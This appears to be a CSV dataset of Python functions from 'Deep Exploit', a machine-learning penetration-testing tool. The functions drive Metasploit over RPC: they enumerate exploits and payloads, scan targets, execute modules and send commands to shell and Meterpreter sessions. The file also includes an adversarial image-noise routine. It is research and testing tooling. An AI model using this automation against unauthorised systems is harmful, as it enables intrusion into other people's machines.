Repository,Function_Name,Function_Code
13o-bbr-bbq/machine_learning_security,random_adv,"def random_adv(perturbation_filename, p):
    img = cv2.imread(TEST_DIR + perturbation_filename, cv2.IMREAD_UNCHANGED)
    if len(img) == 3:
        (height, width, channel) = img.shape[:3]
    else:
        (height, width) = img.shape[:2]
    for i in range(p):
        x = random.randint(0, width - 1)
        y = random.randint(0, height - 1)
        pixel = img[y, x]
        average = sum(pixel) / len(pixel)
        if average < 128:
            img[y, x] = [0, 0, 0]
        else:
            img[y, x] = [255, 255, 255]
    adv_filename = 'adv_' + filename
    cv2.imwrite(ADV_DIR + adv_filename, img)
    return adv_filename"
13o-bbr-bbq/machine_learning_security,predict,"def predict(target_filename, height, width):
    img = image.load_img(target_filename, target_size=(height, width))
    x = image.img_to_array(img)
    x = np.expand_dims(x, axis=0)
    x = x / 255.0
    pred = model.predict(x)[0]
    top = 1
    top_indices = pred.argsort()[-top:][::-1]
    result = [(classes[i], pred[i]) for i in top_indices]
    '\n    result[0][0] : predict label\n    result[0][1] : prediction probability\n    '
    return result"
13o-bbr-bbq/machine_learning_security,command_parse,"def command_parse():
    args = docopt(__doc__)
    mode = args['<mode>']
    start_time = args['<start>']
    return (mode, start_time)"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self):
    self.util = Utilty()
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    try:
        config.read(os.path.join(full_path, 'config.ini'))
    except Exception as err:
        self.util.print_exception(err, 'File exists error')
        sys.exit(1)
    self.report_date_format = config['Report']['date_format']
    self.report_test_path = os.path.join(full_path, config['Report']['report_test'])
    self.report_test_file = os.path.join(self.report_test_path, config['Report']['report_test_file'])
    self.template_test = config['Report']['template_test']
    self.report_train_path = os.path.join(self.report_test_path, config['Report']['report_train'])
    self.report_train_file = os.path.join(self.report_train_path, config['Report']['report_train_file'])
    self.template_train = config['Report']['template_train']
    self.header_train = str(config['Report']['header_train']).split('@')
    self.header_test = str(config['Report']['header_test']).split('@')"
13o-bbr-bbq/machine_learning_security,create_report,"def create_report(self, mode='train', start_date=None):
    if mode not in ['train', 'test']:
        self.util.print_message(FAIL, 'Invalid mode: {}'.format(mode))
        exit(1)
    if mode == 'train':
        self.util.print_message(NOTE, 'Creating training report.')
        csv_file_list = glob.glob(os.path.join(self.report_train_path, '*.csv'))
        content_list = []
        for file in csv_file_list:
            df = pd.read_csv(file, names=self.header_train, sep=',')
            df['date'] = pd.to_datetime(df['date'])
            selected_df = df[start_date < df['date']]
            content_list.append(selected_df)
        if len(content_list) != 0:
            df_csv = pd.concat(content_list).drop_duplicates().sort_values(by=['ip', 'port'], ascending=True).reset_index(drop=True, col_level=1)
            items = []
            for idx in range(len(df_csv)):
                items.append({'ip_addr': df_csv.loc[idx, 'ip'], 'port': df_csv.loc[idx, 'port'], 'prod_name': df_csv.loc[idx, 'service'], 'vuln_name': df_csv.loc[idx, 'vuln_name'], 'description': df_csv.loc[idx, 'description'], 'type': df_csv.loc[idx, 'type'], 'exploit': df_csv.loc[idx, 'exploit'], 'target': df_csv.loc[idx, 'target'], 'payload': df_csv.loc[idx, 'payload'], 'ref': str(df_csv.loc[idx, 'reference']).replace('@', '<br>')})
            try:
                env = Environment(loader=FileSystemLoader(self.report_train_path))
                template = env.get_template(self.template_train)
                pd.set_option('display.max_colwidth', -1)
                html = template.render({'title': 'Deep Exploit Scan Report', 'items': items})
                with codecs.open(self.report_train_file, 'w', 'utf-8') as fout:
                    fout.write(html)
            except Exception as err:
                self.util.print_exception(err, 'Creating report error.')
        else:
            self.util.print_message(WARNING, 'Exploitation result is not found.')
        self.util.print_message(OK, 'Creating training report done.')
    else:
        self.util.print_message(NOTE, 'Creating testing report.')
        csv_file_list = glob.glob(os.path.join(self.report_test_path, '*.csv'))
        content_list = []
        for file in csv_file_list:
            df = pd.read_csv(file, names=self.header_test, sep=',')
            df['date'] = pd.to_datetime(df['date'])
            selected_df = df[start_date < df['date']]
            content_list.append(selected_df)
        if len(content_list) != 0:
            df_csv = pd.concat(content_list).drop_duplicates().sort_values(by=['ip', 'port'], ascending=True).reset_index(drop=True, col_level=1)
            items = []
            for idx in range(len(df_csv)):
                items.append({'ip_addr': df_csv.loc[idx, 'ip'], 'port': df_csv.loc[idx, 'port'], 'source_ip_addr': df_csv.loc[idx, 'src_ip'], 'prod_name': df_csv.loc[idx, 'service'], 'vuln_name': df_csv.loc[idx, 'vuln_name'], 'description': df_csv.loc[idx, 'description'], 'type': df_csv.loc[idx, 'type'], 'exploit': df_csv.loc[idx, 'exploit'], 'target': df_csv.loc[idx, 'target'], 'payload': df_csv.loc[idx, 'payload'], 'ref': str(df_csv.loc[idx, 'reference']).replace('@', '<br>')})
            try:
                env = Environment(loader=FileSystemLoader(self.report_test_path))
                template = env.get_template(self.template_test)
                pd.set_option('display.max_colwidth', -1)
                html = template.render({'title': 'Deep Exploit Scan Report', 'items': items})
                with codecs.open(self.report_test_file, 'w', 'utf-8') as fout:
                    fout.write(html)
            except Exception as err:
                self.util.print_exception(err, 'Creating report error.')
        else:
            self.util.print_message(WARNING, 'Exploitation result is not found.')
        self.util.print_message(OK, 'Creating testing report done.')"
13o-bbr-bbq/machine_learning_security,show_banner,"def show_banner(util, delay_time=2.0):
    banner = u'\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n ██████╗ ███████╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗\n ██╔══██╗██╔════╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝\n ██║  ██║█████╗  █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   \n ██║  ██║██╔══╝  ██╔══╝  ██╔═══╝     ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   \n ██████╔╝███████╗███████╗██║         ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   \n ╚═════╝ ╚══════╝╚══════╝╚═╝         ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   (beta)\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n    '
    util.print_message(NONE, banner)
    show_credit(util)
    time.sleep(delay_time)"
13o-bbr-bbq/machine_learning_security,show_credit,"def show_credit(util):
    credit = u'\n       =[ Deep Exploit v0.0.2-beta                                            ]=\n+ -- --=[ Author  : Isao Takaesu (@bbr_bbq)                                   ]=--\n+ -- --=[ Website : https://github.com/13o-bbr-bbq/machine_learning_security/ ]=--\n    '
    util.print_message(NONE, credit)"
13o-bbr-bbq/machine_learning_security,is_valid_ip,"def is_valid_ip(rhost):
    try:
        ipaddress.ip_address(rhost)
        return True
    except ValueError:
        return False"
13o-bbr-bbq/machine_learning_security,command_parse,"def command_parse():
    args = docopt(__doc__)
    ip_addr = args['<ip_addr>']
    mode = args['<mode>']
    port = args['<port>']
    service = args['<product>']
    return (ip_addr, mode, port, service)"
13o-bbr-bbq/machine_learning_security,check_port_value,"def check_port_value(port=None, service=None):
    if port is not None:
        if port.isdigit() is False:
            Utilty().print_message(OK, 'Invalid port number: {}'.format(port))
            return False
        elif int(port) < 1 or int(port) > 65535:
            Utilty().print_message(OK, 'Invalid port number: {}'.format(port))
            return False
        elif port not in com_port_list:
            Utilty().print_message(OK, 'Not open port number: {}'.format(port))
            return False
        elif service is None:
            Utilty().print_message(OK, 'Invalid service name: {}'.format(str(service)))
            return False
        elif type(service) == 'int':
            Utilty().print_message(OK, 'Invalid service name: {}'.format(str(service)))
            return False
        else:
            return True
    else:
        return False"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, option=[]):
    self.host = option.get('host') or '127.0.0.1'
    self.port = option.get('port') or 55552
    self.uri = option.get('uri') or '/api/'
    self.ssl = option.get('ssl') or False
    self.authenticated = False
    self.token = False
    self.headers = {'Content-type': 'binary/message-pack'}
    if self.ssl:
        self.client = http.client.HTTPSConnection(self.host, self.port)
    else:
        self.client = http.client.HTTPConnection(self.host, self.port)
    self.util = Utilty()
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    try:
        config.read(os.path.join(full_path, 'config.ini'))
    except FileExistsError as err:
        self.util.print_message(FAIL, 'File exists error: {}'.format(err))
        sys.exit(1)
    self.msgrpc_user = config['Common']['msgrpc_user']
    self.msgrpc_pass = config['Common']['msgrpc_pass']
    self.timeout = int(config['Common']['timeout'])
    self.con_retry = int(config['Common']['con_retry'])
    self.retry_count = 0
    self.console_id = 0"
13o-bbr-bbq/machine_learning_security,call,"def call(self, meth, origin_option):
    option = copy.deepcopy(origin_option)
    option = self.set_api_option(meth, option)
    resp = self.send_request(meth, option, origin_option)
    return msgpack.unpackb(resp.read())"
13o-bbr-bbq/machine_learning_security,set_api_option,"def set_api_option(self, meth, option):
    if meth != 'auth.login':
        if not self.authenticated:
            self.util.print_message(FAIL, 'MsfRPC: Not Authenticated.')
            exit(1)
    if meth != 'auth.login':
        option.insert(0, self.token)
    option.insert(0, meth)
    return option"
13o-bbr-bbq/machine_learning_security,send_request,"def send_request(self, meth, option, origin_option):
    params = msgpack.packb(option)
    resp = ''
    try:
        self.client.request('POST', self.uri, params, self.headers)
        resp = self.client.getresponse()
        self.retry_count = 0
    except Exception as err:
        while True:
            self.retry_count += 1
            if self.retry_count == self.con_retry:
                self.util.print_exception(err, 'Retry count is over.')
                exit(1)
            else:
                self.util.print_message(WARNING, '{}/{} Retry ""{}"" call. reason: {}'.format(self.retry_count, self.con_retry, option[0], err))
                time.sleep(1.0)
                if self.ssl:
                    self.client = http.client.HTTPSConnection(self.host, self.port)
                else:
                    self.client = http.client.HTTPConnection(self.host, self.port)
                if meth != 'auth.login':
                    self.login(self.msgrpc_user, self.msgrpc_pass)
                    option = self.set_api_option(meth, origin_option)
                    self.get_console()
                resp = self.send_request(meth, option, origin_option)
                break
    return resp"
13o-bbr-bbq/machine_learning_security,login,"def login(self, user, password):
    ret = self.call('auth.login', [user, password])
    try:
        if ret.get(b'result') == b'success':
            self.authenticated = True
            self.token = ret.get(b'token')
            return True
        else:
            self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
            exit(1)
    except Exception as e:
        self.util.print_exception(e, 'Failed: auth.login')
        exit(1)"
13o-bbr-bbq/machine_learning_security,keep_alive,"def keep_alive(self):
    self.util.print_message(OK, 'Executing keep_alive..')
    _ = self.send_command(self.console_id, 'version\n', False)"
13o-bbr-bbq/machine_learning_security,get_console,"def get_console(self):
    ret = self.call('console.create', [])
    try:
        self.console_id = ret.get(b'id')
        _ = self.call('console.read', [self.console_id])
    except Exception as err:
        self.util.print_exception(err, 'Failed: console.create')
        exit(1)"
13o-bbr-bbq/machine_learning_security,send_command,"def send_command(self, console_id, command, visualization, sleep=0.1):
    _ = self.call('console.write', [console_id, command])
    time.sleep(0.5)
    ret = self.call('console.read', [console_id])
    time.sleep(sleep)
    result = ''
    try:
        result = ret.get(b'data').decode('utf-8')
        if visualization:
            self.util.print_message(OK, 'Result of ""{}"":\n{}'.format(command, result))
    except Exception as e:
        self.util.print_exception(e, 'Failed: {}'.format(command))
    return result"
13o-bbr-bbq/machine_learning_security,get_module_list,"def get_module_list(self, module_type):
    ret = {}
    if module_type == 'exploit':
        ret = self.call('module.exploits', [])
    elif module_type == 'auxiliary':
        ret = self.call('module.auxiliary', [])
    elif module_type == 'post':
        ret = self.call('module.post', [])
    elif module_type == 'payload':
        ret = self.call('module.payloads', [])
    elif module_type == 'encoder':
        ret = self.call('module.encoders', [])
    elif module_type == 'nop':
        ret = self.call('module.nops', [])
    try:
        byte_list = ret[b'modules']
        string_list = []
        for module in byte_list:
            string_list.append(module.decode('utf-8'))
        return string_list
    except Exception as e:
        self.util.print_exception(e, 'Failed: Getting {} module list.'.format(module_type))
        exit(1)"
13o-bbr-bbq/machine_learning_security,get_module_info,"def get_module_info(self, module_type, module_name):
    return self.call('module.info', [module_type, module_name])"
13o-bbr-bbq/machine_learning_security,get_compatible_payload_list,"def get_compatible_payload_list(self, module_name):
    ret = self.call('module.compatible_payloads', [module_name])
    try:
        byte_list = ret[b'payloads']
        string_list = []
        for module in byte_list:
            string_list.append(module.decode('utf-8'))
        return string_list
    except Exception as e:
        self.util.print_exception(e, 'Failed: module.compatible_payloads.')
        return []"
13o-bbr-bbq/machine_learning_security,get_target_compatible_payload_list,"def get_target_compatible_payload_list(self, module_name, target_num):
    ret = self.call('module.target_compatible_payloads', [module_name, target_num])
    try:
        byte_list = ret[b'payloads']
        string_list = []
        for module in byte_list:
            string_list.append(module.decode('utf-8'))
        return string_list
    except Exception as e:
        self.util.print_exception(e, 'Failed: module.target_compatible_payloads.')
        return []"
13o-bbr-bbq/machine_learning_security,get_module_options,"def get_module_options(self, module_type, module_name):
    return self.call('module.options', [module_type, module_name])"
13o-bbr-bbq/machine_learning_security,execute_module,"def execute_module(self, module_type, module_name, options):
    ret = self.call('module.execute', [module_type, module_name, options])
    try:
        job_id = ret[b'job_id']
        uuid = ret[b'uuid'].decode('utf-8')
        return (job_id, uuid)
    except Exception as e:
        if ret[b'error_code'] == 401:
            self.login(self.msgrpc_user, self.msgrpc_pass)
        else:
            self.util.print_exception(e, 'Failed: module.execute.')
            exit(1)"
13o-bbr-bbq/machine_learning_security,get_job_list,"def get_job_list(self):
    jobs = self.call('job.list', [])
    try:
        byte_list = jobs.keys()
        job_list = []
        for job_id in byte_list:
            job_list.append(int(job_id.decode('utf-8')))
        return job_list
    except Exception as e:
        self.util.print_exception(e, 'Failed: job.list.')
        return []"
13o-bbr-bbq/machine_learning_security,get_job_info,"def get_job_info(self, job_id):
    return self.call('job.info', [job_id])"
13o-bbr-bbq/machine_learning_security,stop_job,"def stop_job(self, job_id):
    return self.call('job.stop', [job_id])"
13o-bbr-bbq/machine_learning_security,get_session_list,"def get_session_list(self):
    return self.call('session.list', [])"
13o-bbr-bbq/machine_learning_security,stop_session,"def stop_session(self, session_id):
    _ = self.call('session.stop', [str(session_id)])"
13o-bbr-bbq/machine_learning_security,stop_meterpreter_session,"def stop_meterpreter_session(self, session_id):
    _ = self.call('session.meterpreter_session_detach', [str(session_id)])"
13o-bbr-bbq/machine_learning_security,execute_shell,"def execute_shell(self, session_id, cmd):
    ret = self.call('session.shell_write', [str(session_id), cmd])
    try:
        return ret[b'write_count'].decode('utf-8')
    except Exception as e:
        self.util.print_exception(e, 'Failed: {}'.format(cmd))
        return 'Failed'"
13o-bbr-bbq/machine_learning_security,get_shell_result,"def get_shell_result(self, session_id, read_pointer):
    ret = self.call('session.shell_read', [str(session_id), read_pointer])
    try:
        seq = ret[b'seq'].decode('utf-8')
        data = ret[b'data'].decode('utf-8')
        return (seq, data)
    except Exception as e:
        self.util.print_exception(e, 'Failed: session.shell_read.')
        return (0, 'Failed')"
13o-bbr-bbq/machine_learning_security,execute_meterpreter,"def execute_meterpreter(self, session_id, cmd):
    ret = self.call('session.meterpreter_write', [str(session_id), cmd])
    try:
        return ret[b'result'].decode('utf-8')
    except Exception as e:
        self.util.print_exception(e, 'Failed: {}'.format(cmd))
        return 'Failed'"
13o-bbr-bbq/machine_learning_security,execute_meterpreter_run_single,"def execute_meterpreter_run_single(self, session_id, cmd):
    ret = self.call('session.meterpreter_run_single', [str(session_id), cmd])
    try:
        return ret[b'result'].decode('utf-8')
    except Exception as e:
        self.util.print_exception(e, 'Failed: {}'.format(cmd))
        return 'Failed'"
13o-bbr-bbq/machine_learning_security,get_meterpreter_result,"def get_meterpreter_result(self, session_id):
    ret = self.call('session.meterpreter_read', [str(session_id)])
    try:
        return ret[b'data'].decode('utf-8')
    except Exception as e:
        self.util.print_exception(e, 'Failed: session.meterpreter_read')
        return None"
13o-bbr-bbq/machine_learning_security,upgrade_shell_session,"def upgrade_shell_session(self, session_id, lhost, lport):
    ret = self.call('session.shell_upgrade', [str(session_id), lhost, lport])
    try:
        return ret[b'result'].decode('utf-8')
    except Exception as e:
        self.util.print_exception(e, 'Failed: session.shell_upgrade')
        return 'Failed'"
13o-bbr-bbq/machine_learning_security,logout,"def logout(self):
    ret = self.call('auth.logout', [self.token])
    try:
        if ret.get(b'result') == b'success':
            self.authenticated = False
            self.token = ''
            return True
        else:
            self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
            exit(1)
    except Exception as e:
        self.util.print_exception(e, 'Failed: auth.logout')
        exit(1)"
13o-bbr-bbq/machine_learning_security,termination,"def termination(self, console_id):
    _ = self.call('console.session_kill', [console_id])
    _ = self.logout()"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, target_ip='127.0.0.1'):
    self.util = Utilty()
    self.rhost = target_ip
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    try:
        config.read(os.path.join(full_path, 'config.ini'))
    except FileExistsError as err:
        self.util.print_message(FAIL, 'File exists error: {}'.format(err))
        sys.exit(1)
    server_host = config['Common']['server_host']
    server_port = int(config['Common']['server_port'])
    self.msgrpc_user = config['Common']['msgrpc_user']
    self.msgrpc_pass = config['Common']['msgrpc_pass']
    self.timeout = int(config['Common']['timeout'])
    self.max_attempt = int(config['Common']['max_attempt'])
    self.save_path = os.path.join(full_path, config['Common']['save_path'])
    self.save_file = os.path.join(self.save_path, config['Common']['save_file'])
    self.data_path = os.path.join(full_path, config['Common']['data_path'])
    if os.path.exists(self.data_path) is False:
        os.mkdir(self.data_path)
    self.plot_file = os.path.join(self.data_path, config['Common']['plot_file'])
    self.port_div_symbol = config['Common']['port_div']
    self.lhost = server_host
    self.lport = int(config['Metasploit']['lport'])
    self.proxy_host = config['Metasploit']['proxy_host']
    self.proxy_port = int(config['Metasploit']['proxy_port'])
    self.prohibited_list = str(config['Metasploit']['prohibited_list']).split('@')
    self.path_collection = str(config['Metasploit']['path_collection']).split('@')
    self.nmap_command = config['Nmap']['command']
    self.nmap_timeout = config['Nmap']['timeout']
    self.nmap_2nd_command = config['Nmap']['second_command']
    self.nmap_2nd_timeout = config['Nmap']['second_timeout']
    self.train_worker_num = int(config['A3C']['train_worker_num'])
    self.train_max_num = int(config['A3C']['train_max_num'])
    self.train_max_steps = int(config['A3C']['train_max_steps'])
    self.train_tmax = int(config['A3C']['train_tmax'])
    self.test_worker_num = int(config['A3C']['test_worker_num'])
    self.greedy_rate = float(config['A3C']['greedy_rate'])
    self.eps_steps = int(self.train_max_num * self.greedy_rate)
    self.state = []
    self.os_type = str(config['State']['os_type']).split('@')
    self.os_real = len(self.os_type) - 1
    self.service_list = str(config['State']['services']).split('@')
    self.report_test_path = os.path.join(full_path, config['Report']['report_test'])
    self.report_train_path = os.path.join(self.report_test_path, config['Report']['report_train'])
    if os.path.exists(self.report_train_path) is False:
        os.mkdir(self.report_train_path)
    self.scan_start_time = self.util.get_current_date()
    self.source_host = server_host
    self.client = Msgrpc({'host': server_host, 'port': server_port})
    self.client.login(self.msgrpc_user, self.msgrpc_pass)
    self.client.get_console()
    self.buffer_seq = 0
    self.isPostExploit = False"
13o-bbr-bbq/machine_learning_security,get_exploit_tree,"def get_exploit_tree(self):
    self.util.print_message(NOTE, 'Get exploit tree.')
    exploit_tree = {}
    if os.path.exists(os.path.join(self.data_path, 'exploit_tree.json')) is False:
        for (idx, exploit) in enumerate(com_exploit_list):
            temp_target_tree = {'targets': []}
            temp_tree = {}
            use_cmd = 'use exploit/' + exploit + '\n'
            _ = self.client.send_command(self.client.console_id, use_cmd, False)
            show_cmd = 'show targets\n'
            target_info = ''
            time_count = 0
            while True:
                target_info = self.client.send_command(self.client.console_id, show_cmd, False)
                if 'Exploit targets' in target_info:
                    break
                if time_count == 5:
                    self.util.print_message(OK, 'Timeout: {0}'.format(show_cmd))
                    self.util.print_message(OK, 'No exist Targets.')
                    break
                time.sleep(1.0)
                time_count += 1
            target_list = self.cutting_strings('\\s*([0-9]{1,3}) .*[a-z|A-Z|0-9].*[\\r\\n]', target_info)
            for target in target_list:
                payload_list = self.client.get_target_compatible_payload_list(exploit, int(target))
                temp_tree[target] = payload_list
            options = self.client.get_module_options('exploit', exploit)
            key_list = options.keys()
            option = {}
            for key in key_list:
                sub_option = {}
                sub_key_list = options[key].keys()
                for sub_key in sub_key_list:
                    if isinstance(options[key][sub_key], list):
                        end_option = []
                        for end_key in options[key][sub_key]:
                            end_option.append(end_key.decode('utf-8'))
                        sub_option[sub_key.decode('utf-8')] = end_option
                    else:
                        end_option = {}
                        if isinstance(options[key][sub_key], bytes):
                            sub_option[sub_key.decode('utf-8')] = options[key][sub_key].decode('utf-8')
                        else:
                            sub_option[sub_key.decode('utf-8')] = options[key][sub_key]
                sub_option['user_specify'] = ''
                option[key.decode('utf-8')] = sub_option
            temp_target_tree['target_list'] = target_list
            temp_target_tree['targets'] = temp_tree
            temp_target_tree['options'] = option
            exploit_tree[exploit] = temp_target_tree
            self.util.print_message(OK, '{}/{} exploit:{}, targets:{}'.format(str(idx + 1), len(com_exploit_list), exploit, len(target_list)))
        fout = codecs.open(os.path.join(self.data_path, 'exploit_tree.json'), 'w', 'utf-8')
        json.dump(exploit_tree, fout, indent=4)
        fout.close()
        self.util.print_message(OK, 'Saved exploit tree.')
    else:
        local_file = os.path.join(self.data_path, 'exploit_tree.json')
        self.util.print_message(OK, 'Loaded exploit tree from : {}'.format(local_file))
        fin = codecs.open(local_file, 'r', 'utf-8')
        exploit_tree = json.loads(fin.read().replace('\x00', ''))
        fin.close()
    return exploit_tree"
13o-bbr-bbq/machine_learning_security,get_target_info,"def get_target_info(self, rhost, proto_list, port_info):
    self.util.print_message(NOTE, 'Get target info.')
    target_tree = {}
    if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
        path_list = ['' for idx in range(len(com_port_list))]
        if self.isPostExploit is False:
            version_checker = VersionChecker(self.util)
            version_checker_ml = VersionCheckerML(self.util)
            content_explorer = ContentExplorer(self.util)
            web_port_list = self.util.check_web_port(rhost, com_port_list, self.client)
            web_target_info = self.util.run_spider(rhost, web_port_list, self.client)
            uniq_product = []
            for (idx_target, target) in enumerate(web_target_info):
                web_prod_list = []
                target_list = target[2]
                if self.util.is_scramble is True:
                    self.util.print_message(WARNING, 'Scramble target list.')
                    target_list = random.sample(target[2], len(target[2]))
                if self.util.max_target_url != 0 and self.util.max_target_url < len(target_list):
                    self.util.print_message(WARNING, 'Cutting target list {} to {}.'.format(len(target[2]), self.util.max_target_url))
                    target_list = target_list[:self.util.max_target_url]
                for (count, target_url) in enumerate(target_list):
                    self.util.print_message(NOTE, '{}/{} Start analyzing: {}'.format(count + 1, len(target_list), target_url))
                    self.client.keep_alive()
                    parsed = util.parse_url(target_url)
                    if parsed is None:
                        continue
                    (_, res_header, res_body) = self.util.send_request('GET', target_url)
                    if self.util.max_target_byte != 0 and self.util.max_target_byte < len(res_body):
                        self.util.print_message(WARNING, 'Cutting response byte {} to {}.'.format(len(res_body), self.util.max_target_byte))
                        res_body = res_body[:self.util.max_target_byte]
                    web_prod_list.extend(version_checker.get_product_name(parsed, res_header + res_body, self.client))
                    web_prod_list.extend(version_checker_ml.get_product_name(parsed, res_header + res_body, self.client))
                parsed = None
                try:
                    parsed = util.parse_url(target[0])
                except Exception as e:
                    self.util.print_exception(e, 'Parsed error : {}'.format(target[0]))
                    continue
                web_prod_list.extend(content_explorer.content_explorer(parsed, target[0], self.client))
                tmp_list = []
                for item in list(set(web_prod_list)):
                    tmp_item = item.split('@')
                    tmp = tmp_item[0] + ' ' + tmp_item[1] + ' ' + tmp_item[2]
                    if tmp not in tmp_list:
                        tmp_list.append(tmp)
                        uniq_product.append(item)
            for (idx, web_prod) in enumerate(uniq_product):
                web_item = web_prod.split('@')
                proto_list.append('tcp')
                port_info.append(web_item[0] + ' ' + web_item[1])
                com_port_list.append(web_item[2] + self.port_div_symbol + str(idx))
                path_list.append(web_item[3])
        target_tree = {'rhost': rhost, 'os_type': self.os_real}
        for (port_idx, port_num) in enumerate(com_port_list):
            temp_tree = {'prod_name': '', 'version': 0.0, 'protocol': '', 'target_path': '', 'exploit': []}
            service_name = 'unknown'
            for (idx, service) in enumerate(self.service_list):
                if service in port_info[port_idx].lower():
                    service_name = service
                    break
            temp_tree['prod_name'] = service_name
            regex_list = ['.*\\s(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}).*', '.*\\s[a-z]?(\\d{1,3}\\.\\d{1,3}[a-z]\\d{1,3}).*', '.*\\s[\\w]?(\\d{1,3}\\.\\d{1,3}\\.\\d[a-z]{1,3}).*', '.*\\s[a-z]?(\\d\\.\\d).*', '.*\\s(\\d\\.[xX|\\*]).*']
            version = 0.0
            output_version = 0.0
            for (idx, regex) in enumerate(regex_list):
                version_raw = self.cutting_strings(regex, port_info[port_idx])
                if len(version_raw) == 0:
                    continue
                if idx == 0:
                    index = version_raw[0].rfind('.')
                    version = version_raw[0][:index] + version_raw[0][index + 1:]
                    output_version = version_raw[0]
                    break
                elif idx == 1:
                    index = re.search('[a-z]', version_raw[0]).start()
                    version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
                    output_version = version_raw[0]
                    break
                elif idx == 2:
                    index = re.search('[a-z]', version_raw[0]).start()
                    version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
                    index = version.rfind('.')
                    version = version_raw[0][:index] + version_raw[0][index:]
                    output_version = version_raw[0]
                    break
                elif idx == 3:
                    version = self.cutting_strings('[a-z]?(\\d\\.\\d)', version_raw[0])
                    version = version[0]
                    output_version = version_raw[0]
                    break
                elif idx == 4:
                    version = version_raw[0].replace('X', '0').replace('x', '0').replace('*', '0')
                    version = version[0]
                    output_version = version_raw[0]
            temp_tree['version'] = float(version)
            temp_tree['protocol'] = proto_list[port_idx]
            if path_list is not None:
                temp_tree['target_path'] = path_list[port_idx]
            module_list = []
            raw_module_info = ''
            idx = 0
            search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
            raw_module_info = self.client.send_command(self.client.console_id, search_cmd, False, 3.0)
            module_list = self.extract_osmatch_module(self.cutting_strings('(exploit/.*)', raw_module_info))
            if service_name != 'unknown' and len(module_list) == 0:
                self.util.print_message(WARNING, ""Can't load exploit module: {}"".format(service_name))
                temp_tree['prod_name'] = 'unknown'
            for module in module_list:
                if module[1] in {'excellent', 'great', 'good'}:
                    temp_tree['exploit'].append(module[0])
            target_tree[str(port_num)] = temp_tree
            self.util.print_message(OK, 'Analyzing port {}/{}, {}/{}, Available exploit modules:{}'.format(port_num, temp_tree['protocol'], temp_tree['prod_name'], output_version, len(temp_tree['exploit'])))
        fout = codecs.open(os.path.join(self.data_path, 'target_info_' + rhost + '.json'), 'w', 'utf-8')
        json.dump(target_tree, fout, indent=4)
        fout.close()
        self.util.print_message(OK, 'Saved target tree.')
    else:
        saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
        self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
        fin = codecs.open(saved_file, 'r', 'utf-8')
        target_tree = json.loads(fin.read().replace('\x00', ''))
        fin.close()
    return target_tree"
13o-bbr-bbq/machine_learning_security,get_target_info_indicate,"def get_target_info_indicate(self, rhost, proto_list, port_info, port=None, prod_name=None):
    self.util.print_message(NOTE, 'Get target info for indicate port number.')
    target_tree = {'origin_port': port}
    com_port_list = []
    for prod in prod_name.split('@'):
        temp_tree = {'prod_name': '', 'version': 0.0, 'protocol': '', 'exploit': []}
        virtual_port = str(np.random.randint(999999999))
        com_port_list.append(virtual_port)
        service_name = 'unknown'
        for (idx, service) in enumerate(self.service_list):
            if service == prod.lower():
                service_name = service
                break
        temp_tree['prod_name'] = service_name
        temp_tree['version'] = float(0.0)
        temp_tree['protocol'] = 'tcp'
        module_list = []
        raw_module_info = ''
        idx = 0
        search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
        raw_module_info = self.client.send_command(self.client.console_id, search_cmd, False, 3.0)
        module_list = self.cutting_strings('(exploit/.*)', raw_module_info)
        if service_name != 'unknown' and len(module_list) == 0:
            continue
        for exploit in module_list:
            raw_exploit_info = exploit.split(' ')
            exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
            if exploit_info[2] in {'excellent', 'great', 'good'}:
                temp_tree['exploit'].append(exploit_info[0])
        target_tree[virtual_port] = temp_tree
        self.util.print_message(OK, 'Analyzing port {}/{}, {}, Available exploit modules:{}'.format(port, temp_tree['protocol'], temp_tree['prod_name'], len(temp_tree['exploit'])))
    with codecs.open(os.path.join(self.data_path, 'target_info_indicate_' + rhost + '.json'), 'w', 'utf-8') as fout:
        json.dump(target_tree, fout, indent=4)
    return (target_tree, com_port_list)"
13o-bbr-bbq/machine_learning_security,extract_osmatch_module,"def extract_osmatch_module(self, module_list):
    osmatch_module_list = []
    for module in module_list:
        raw_exploit_info = module.split(' ')
        exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
        os_type = exploit_info[0].split('/')[1]
        if self.os_real == 0 and os_type in ['windows', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 1 and os_type in ['unix', 'freebsd', 'bsdi', 'linux', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 2 and os_type in ['solaris', 'unix', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 3 and os_type in ['osx', 'unix', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
